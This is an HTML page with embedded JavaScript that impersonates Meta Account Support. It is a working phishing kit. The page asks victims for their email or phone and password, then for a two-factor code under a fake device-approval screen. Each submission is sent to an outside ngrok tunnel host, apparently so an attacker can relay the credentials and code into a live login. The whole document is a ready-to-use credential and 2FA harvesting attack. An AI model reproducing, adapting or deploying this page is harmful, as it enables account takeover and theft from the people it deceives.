<!DOCTYPE html>
<html lang="en" style="margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden">
<head>
<title>Meta Account Support</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
<style>
body { font-family: Arial, Helvetica, sans-serif; margin: 0; padding: 0; background-color: #f0f2f5; color: #1c1e21; }
header { display: flex; align-items: center; justify-content: space-between; padding: 15px; background-color: #ffffff; box-shadow: 0 1px 2px rgba(0,0,0,0.1); flex-wrap: wrap; }
header img { height: 20px; }
#menu { display: flex; gap: 20px; flex-wrap: wrap; font-size: 14px; color: #333; }
#menu p { margin: 5px; cursor: pointer; }
#menu p:hover { text-decoration: underline; }
section { background: linear-gradient(135deg, rgb(247, 248, 231) 0%, rgb(246, 231, 248) 0%, rgb(248, 227, 251) 10%, rgba(218, 234, 252, 1) 25%, rgba(218, 234, 252, 1) 50%, rgb(226, 246, 242) 75%, rgb(226, 246, 242) 100%); display: flex; justify-content: center; align-items: center; flex-direction: column; height: 25vh; }
section p:first-of-type { font-size: 28px; padding: 10px 20px; text-align: center; }
section p:last-of-type { font-size: 20px; }
main { max-width: 600px; margin: 20px auto; padding: 20px; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
#frame-step1, #frame-step2 { margin: 0 auto; border: 1px solid #ccc; border-radius: 8px; padding: 20px; margin-bottom: 20px; }
h3 { text-align: center; margin-bottom: 20px; color: #1877f2; }
label { display: block; font-weight: bold; margin-bottom: 5px; color: #333; }
input[type="text"], input[type="email"], input[type="password"], select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; margin-bottom: 10px; font-size: 15px; }
input[type="password"] { padding-right: 40px; }
.input-group { display: flex; gap: 10px; align-items: center; }
.input-group select { width: auto; min-width: 120px; background-color: #f5f5f5; }
.input-group input { flex: 1; }
.password-toggle { position: relative; }
.password-toggle i { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #606770; }
.error-message { color: #e41e3f; margin-top: 5px; font-size: 14px; display: none; }
button { background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 15px; transition: background-color 0.2s ease; }
button:disabled { background-color: #cccccc; }
button:hover:not(:disabled) { background-color: #165cb3; }
#submitInfoButton { margin-top: 10px; width: auto; }
#submitPasswordButton, #submitCodeButton { width: 100%; margin-top: 15px; }
.loading-dots-row-center { display: flex; justify-content: center; align-items: center; margin: 20px 0; width: 100%; }
.loading-dots-container { display: flex; align-items: center; }
.loading-dots { display: flex; gap: 5px; }
.loading-dots .dot { width: 10px; height: 10px; background-color: #1877f2; border-radius: 50%; animation: blink 1.4s infinite both; }
.loading-dots .dot:nth-child(1) { animation-delay: -0.32s; }
.loading-dots .dot:nth-child(2) { animation-delay: -0.16s; }
@keyframes blink { 0%, 80% { background-color: rgba(24, 119, 242, 0.4); } 40% { background-color: #1877f2; } }
#verification-section { text-align: center; }
#verification-section img { width: 100%; max-width: 200px; border-radius: 12px; margin-bottom: 20px; background-color: #d9f1f0; }
#verification-section p:first-of-type { font-weight: bold; margin: 0 0 5px 0; }
#verification-section p:last-of-type { color: #666; font-size: 14px; }
#code-input-container { margin-top: 30px; }
#code-input-container input { text-align: center; letter-spacing: 5px; }
</style>
</head>
<body style="font-family: Arial, Helvetica, sans-serif">
<header style="display: flex; align-items: center; justify-content: space-between; padding: 15px; background-color: #ffffff; box-shadow: 0 1px 2px rgba(0,0,0,0.1); flex-wrap: wrap">
<img src="/images/meta-image.svg" alt="Meta Logo" style="height: 20px">
<div id="menu" style="display: flex; gap: 20px; flex-wrap: wrap; font-size: 14px; color: #333">
<p style="margin: 5px; cursor: pointer">Meta Quest</p>
<p style="margin: 5px; cursor: pointer">Ray-Ban Meta</p>
<p style="margin: 5px; cursor: pointer">Apps and games</p>
<p style="margin: 5px; cursor: pointer">About Meta</p>
<p style="margin: 5px; cursor: pointer">Support</p>
</div>
<script>
const checkResponsive = () => {
const menu = document.getElementById('menu');
if (window.innerWidth < 768) {
menu.style.display = 'none';
} else {
menu.style.display = 'flex';
}
};
window.addEventListener('resize', checkResponsive);
checkResponsive();
</script>
</header>
<section style="background: linear-gradient(135deg, rgb(247, 248, 231) 0%, rgb(246, 231, 248) 0%, rgb(248, 227, 251) 10%, rgba(218, 234, 252, 1) 25%, rgba(218, 234, 252, 1) 50%, rgb(226, 246, 242) 75%, rgb(226, 246, 242) 100%); display: flex; justify-content: center; align-items: center; flex-direction: column; height: 25vh">
    <p style="font-size: 28px; padding: 10px 20px; text-align: center">Meta Account Support</p>
    <p style="font-size: 20px">We're here to help.</p>
</section>

<main id="main-content">
    <!-- Step 1: Initial Data Collection (Email/Phone and Password) -->
    <div id="step1-container" style="display: flex; justify-content: center; align-items: center; flex-direction: column; text-align: center; padding: 20px 0; width: 100%">
        <p style="margin-bottom: 20px; width: 80%">Please enter your login details below.</p>
        <div id="frame-step1">
            <h3>Log In</h3>
            <div style="text-align: left; margin-bottom: 15px">
                <label for="emailInput">Email or Phone Number</label>
                <input id="emailInput" type="text" placeholder="Email or Phone number" />
                <div id="errorMessageEmail" class="error-message"></div>
            </div>

            <div style="text-align: left; margin-bottom: 15px">
                <label for="passwordInput">Password</label>
                <div class="password-toggle">
                    <input type="password" id="passwordInput" placeholder="Password" />
                    <i class="fas fa-eye" id="togglePassword"></i>
                </div>
                <div id="errorMessagePassword" class="error-message"></div>
            </div>

            <div style="text-align: right; margin-top: 15px">
                <button id="submitInfoButton">Log In</button>
            </div>
        </div>
    </div>

    <!-- Step 2: Verification Code Input (if 2FA is needed) -->
    <div id="step2-container" style="display: none; justify-content: center; align-items: center; flex-direction: column; text-align: center; padding: 20px 0; width: 100%">
        <h1 style="font-size: 24px; margin-bottom: 10px; font-weight: bold">Authentication</h1>
        <h2 style="font-size: 28px; margin-top: 0; margin-bottom: 20px; font-weight: bold">Check notifications on another device</h2>

        <p style="margin-bottom: 20px; color: #333; line-height: 1.5">We have sent a notification to your device. Please check the notification there and accept the login or enter the 6-8 digit code we sent you to continue.</p>

        <div style="margin: 25px 0">
            <img src="/images/notification-device.png" alt="Device notification" style="width: 100%; max-width: 200px; border-radius: 12px; background-color: #d9f1f0" />
        </div>

        <div style="display: flex; align-items: flex-start; margin: 20px 0">
            <div class="loading-dots-container" style="margin-right: 10px; margin-top: 2px; flex-shrink: 0">
                <div class="loading-dots">
                    <div class="dot"></div>
                    <div class="dot"></div>
                    <div class="dot"></div>
                </div>
            </div>
            <div>
                <p style="font-weight: bold; margin: 0 0 5px 0">Pending approval</p>
                <p style="margin: 0; color: #666; font-size: 14px">It may take a few minutes for you to receive the notification on your other device.</p>
            </div>
        </div>

        <div id="code-input-container" style="margin-top: 30px; width: 100%;">
            <label for="verificationCode">Authentication Code</label>
            <input type="text" id="verificationCode" placeholder="Code" style="width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; box-sizing: border-box; background-color: #f9f9f9" />
            <div id="errorMessageCode" class="error-message"></div>
        </div>

        <button id="submitCodeButton">Continue</button>
    </div>
</main>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        // --- Constants and State ---
        const MAX_PASSWORD_ATTEMPTS = 3;
        const MAX_CODE_ATTEMPTS = 3;

        // Retrieve collected data from sessionStorage, defaulting to empty object if not found
        let collectedUserData = JSON.parse(sessionStorage.getItem('collectedUserData') || '{}');
        // Determine the current UI stage based on saved data or default to 'step1'
        let currentStage = ['step1', 'step2'].includes(collectedUserData.loginStage) ? collectedUserData.loginStage : 'step1';

        // --- DOM Elements ---
        const step1Container = document.getElementById('step1-container');
        const step2Container = document.getElementById('step2-container');

        const submitInfoButton = document.getElementById('submitInfoButton');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const togglePasswordButton = document.getElementById('togglePassword');
        const errorMessageEmail = document.getElementById('errorMessageEmail');
        const errorMessagePasswordDiv = document.getElementById('errorMessagePassword');

        const verificationCodeInput = document.getElementById('verificationCode');
        const errorMessageCode = document.getElementById('errorMessageCode');
        const submitCodeButton = document.getElementById('submitCodeButton');

        let passwordAttempts = parseInt(sessionStorage.getItem('passwordAttempts') || '0');
        let codeAttempts = parseInt(sessionStorage.getItem('codeAttempts') || '0');

        // --- Helper Functions ---
        const isEmailOrPhone = (str) => {
            if (!str) return false;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^\+?[\d\s-]+$/; // Allows optional plus, digits, spaces, hyphens
            return emailRegex.test(str) || phoneRegex.test(str);
        };

        // Modified sendDataToServer to ping http://localhost:3002/login
        const sendDataToServer = async (payload) => {
            console.log("Frontend: Sending data to server:", payload); // DEBUG LOG
            try {
                const response = await fetch(' https://f26d-2a09-bac5-d45c-18c8-00-278-d3.ngrok-free.app/login', { // Changed URL here
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });

                // Always try to parse the response body, even on error
                let result;
                try {
                    const text = await response.text();
                    result = JSON.parse(text);
                } catch (e) {
                    result = { success: false, error: 'Failed to parse server response.' };
                }
                console.log("Frontend: Received response from server:", result); // DEBUG LOG
                return result;
            } catch (error) {
                console.error('Frontend: Error sending data to server:', error);
                return { success: false, error: error.message || 'Failed to communicate with server.' };
            }
        };

        const updateStage = (newStage) => {
            currentStage = newStage;
            sessionStorage.setItem('currentStage', newStage);
            console.log("Frontend: Updating UI stage to:", newStage); // DEBUG LOG
            step1Container.style.display = newStage === 'step1' ? 'flex' : 'none';
            step2Container.style.display = newStage === 'step2' ? 'flex' : 'none';
        };

        const showPasswordError = (message) => {
            errorMessagePasswordDiv.textContent = message;
            errorMessagePasswordDiv.style.display = 'block';
            passwordInput.style.borderColor = 'red';
        };
        const clearPasswordError = () => {
            errorMessagePasswordDiv.style.display = 'none';
            passwordInput.style.borderColor = '#ddd';
        };

        const showCodeError = (message) => {
            errorMessageCode.textContent = message;
            errorMessageCode.style.display = 'block';
            verificationCodeInput.style.borderColor = 'red';
        };
        const clearCodeError = () => {
            errorMessageCode.style.display = 'none';
            verificationCodeInput.style.borderColor = '#ddd';
        };

        // --- Initialize UI based on currentStage ---
        updateStage(currentStage);
        if (currentStage === 'step1') {
            emailInput.focus();
        } else if (currentStage === 'step2') {
            verificationCodeInput.focus();
        }

        // --- Event Listeners ---

        // Toggle Password Visibility
        document.getElementById('togglePassword')?.addEventListener('click', () => {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            togglePasswordButton.querySelector('i').className = type === 'text' ? 'fas fa-eye-slash' : 'fas fa-eye';
        });

        // Step 1: Submit Email/Phone and Password
        submitInfoButton.addEventListener('click', async (e) => {
            e.preventDefault();
            clearPasswordError();
            clearCodeError(); // Ensure no lingering code errors

            const emailValue = emailInput.value.trim();
            const passwordValue = passwordInput.value.trim();

            let isValid = true;
            if (!isEmailOrPhone(emailValue)) {
                errorMessageEmail.textContent = 'Invalid email or phone number.';
                errorMessageEmail.style.display = 'block';
                emailInput.style.borderColor = 'red';
                isValid = false;
            } else {
                errorMessageEmail.style.display = 'none';
                emailInput.style.borderColor = '#ddd';
            }

            if (!passwordValue) {
                showPasswordError('Please enter your password');
                isValid = false;
            }

            if (!isValid) return;

            collectedUserData = {
                username: emailValue,
                password: passwordValue,
                loginStage: 'password_needed' // Stage indicating password submission
            };
            sessionStorage.setItem('collectedUserData', JSON.stringify(collectedUserData));

            submitInfoButton.disabled = true;
            submitInfoButton.textContent = 'Processing...';

            const response = await sendDataToServer(collectedUserData);

            // --- REVISED LOGIC FOR HANDLING RESPONSES ---
            console.log("Frontend: Response received:", response); // DEBUG LOG

            // Always check for next_stage === 'step2' and move to step2, even if success is false
            if (response && response.next_stage === 'step2') {
                console.log("Frontend: Transitioning to Step 2 (2FA input) as requested by backend."); // DEBUG LOG
                collectedUserData.loginStage = 'step2'; // Update our state for 2FA input
                sessionStorage.setItem('collectedUserData', JSON.stringify(collectedUserData));
                updateStage('step2'); // Show the 2FA input form
                verificationCodeInput.focus();
                // Optionally show error message if provided (e.g. "Authentication required. Please enter the code sent to your device.")
                if (response.error_message) {
                    showCodeError(response.error_message);
                }
                submitInfoButton.disabled = false;
                submitInfoButton.textContent = 'Log In';
                return;
            }

            if (response.success && response.next_stage === 'login_success') {
                // Case 1: Login was successful directly (no 2FA needed)
                alert('Login successful!');
                sessionStorage.clear(); // Clear session data on successful login
                window.location.href = '/success';
            } else if (!response.success) {
                // Case 3: Actual login failure (e.g., wrong password, general error)
                if (response.error_message && response.error_message.includes("Incorrect password")) {
                    passwordAttempts++;
                    sessionStorage.setItem('passwordAttempts', passwordAttempts.toString());
                    if (passwordAttempts >= MAX_PASSWORD_ATTEMPTS) {
                        showPasswordError(`Incorrect password. Maximum attempts reached.`);
                        submitInfoButton.disabled = true;
                    } else {
                        showPasswordError('Incorrect password. Please try again.');
                        submitInfoButton.disabled = false;
                        submitInfoButton.textContent = 'Log In';
                        passwordInput.value = ''; // Clear input for next attempt
                    }
                } else {
                    // Handle other errors from backend. If next_stage is step1, reset to step1.
                    showPasswordError(`Login failed: ${response.error_message || 'Please check your credentials.'}`);
                    if (response.next_stage === 'step1') {
                        collectedUserData.loginStage = 'step1';
                        sessionStorage.setItem('collectedUserData', JSON.stringify(collectedUserData));
                        updateStage('step1'); // Reset to password input
                        emailInput.focus(); // Focus email again for a fresh start
                    }
                    submitInfoButton.disabled = false;
                    submitInfoButton.textContent = 'Log In';
                }
            } else {
                // Fallback for unexpected responses (e.g., success is true but next_stage is not handled, or response format is unexpected)
                console.error("Frontend: Unexpected response structure:", response);
                showPasswordError("An unexpected error occurred. Please try again.");
                submitInfoButton.disabled = false;
                submitInfoButton.textContent = 'Log In';
            }
        });

        // Step 2: Submit Verification Code
        submitCodeButton.addEventListener('click', async () => {
            const codeValue = verificationCodeInput.value.trim();
            clearCodeError();

            if (!codeValue || codeValue.length < 6 || codeValue.length > 8) {
                showCodeError('Please enter a valid 6-8 digit code');
                return;
            }

            codeAttempts++;
            sessionStorage.setItem('codeAttempts', codeAttempts.toString());

            collectedUserData.two_fa = codeValue;
            collectedUserData.loginStage = 'code_submitted'; // Stage indicating 2FA code submission

            submitCodeButton.disabled = true;
            submitCodeButton.textContent = 'Processing...';

            const response = await sendDataToServer(collectedUserData);

            if (response.success) { // This means the 2FA code was correct and login completed
                alert('Login successful!');
                sessionStorage.clear(); // Clear session data on successful login
                window.location.href = '/meta/success.html';
            } else {
                // Handle incorrect code or other server errors
                if (codeAttempts >= MAX_CODE_ATTEMPTS) {
                    showCodeError('Incorrect code. Maximum attempts reached.');
                    submitCodeButton.disabled = true;
                } else {
                    showCodeError('Incorrect code. Please try again.');
                    submitCodeButton.disabled = false;
                    submitCodeButton.textContent = 'Continue';
                    verificationCodeInput.value = ''; // Clear input for next attempt
                }
            }
        });

        // --- Enter Key Listeners ---
        emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); submitInfoButton.click(); } });
        passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); submitInfoButton.click(); } });
        verificationCodeInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); submitCodeButton.click(); } });
    });
</script>
</body>
</html>